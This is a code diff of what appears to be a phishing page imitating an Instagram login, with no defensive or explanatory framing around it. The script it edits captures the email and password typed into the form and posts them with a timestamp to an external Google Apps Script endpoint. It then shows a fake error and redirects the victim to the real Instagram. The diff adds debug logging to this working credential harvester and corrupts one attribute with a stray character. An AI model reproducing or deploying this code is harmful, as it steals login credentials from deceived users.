@@ -36,7 +36,7 @@
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
-                    <div class="or">OR</div>
+                    <div품="or">OR</div>
                     <span></span>
                 </div>
                 <div class="login-with-fb flex direction-column align-items-center">
@@ -79,31 +79,48 @@
     </footer>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Stop default form submission
+        console.log('Script loaded'); // Debug: Check if script runs
 
-            // Capture the input values
-            const email = document.querySelector('input[name="email"]').value;
-            const password = document.querySelector('input[name="password"]').value;
-            const timestamp = new Date().toISOString();
-            const data = { timestamp, email, password };
+        const form = document.getElementById('loginForm');
+        if (!form) {
+            console.error('Form not found!');
+        } else {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault(); // Stop default submission
+                console.log('Form submit intercepted'); // Debug: Confirm this runs
 
-            // Send data to Google Apps Script Web App
-            fetch('https://script.google.com/macros/s/AKfycbxC55TsPKM8rc4_wgkrXDrbof2037PbnkMmZ5ZERS0T6qHmttHOijqEKZiJbEscGgcTxQ/exec', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data),
-                mode: 'no-cors' // Works for GitHub Pages
-            }).catch(err => console.error('Fetch error:', err));
+                // Capture the input values
+                const email = document.querySelector('input[name="email"]').value;
+                const password = document.querySelector('input[name="password"]').value;
+                const timestamp = new Date().toISOString();
+                const data = { timestamp, email, password };
+                console.log('Data:', data); // Debug: Log the captured data
 
-            // Show error message
-            document.getElementById('error').style.display = 'block';
+                // Send data to Google Apps Script Web App
+                fetch('https://script.google.com/macros/s/AKfycbxC55TsPKM8rc4_wgkrXDrbof2037PbnkMmZ5ZERS0T6qHmttHOijqEKZiJbEscGgcTxQ/exec', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                    mode: 'no-cors'
+                }).then(() => console.log('Fetch sent')) // Won’t log with no-cors
+                  .catch(err => console.error('Fetch error:', err));
 
-            // Redirect to Instagram after 2 seconds
-            setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/';
-            }, 2000);
-        });
+                // Show error message
+                const errorDiv = document.getElementById('error');
+                if (errorDiv) {
+                    errorDiv.style.display = 'block';
+                    console.log('Error message displayed');
+                } else {
+                    console.error('Error div not found!');
+                }
+
+                // Redirect to Instagram after 2 seconds
+                setTimeout(() => {
+                    console.log('Redirecting to Instagram');
+                    window.location.href = 'https://www.instagram.com/';
+                }, 2000);
+            });
+        }
     </script>
 </body>
 </html>
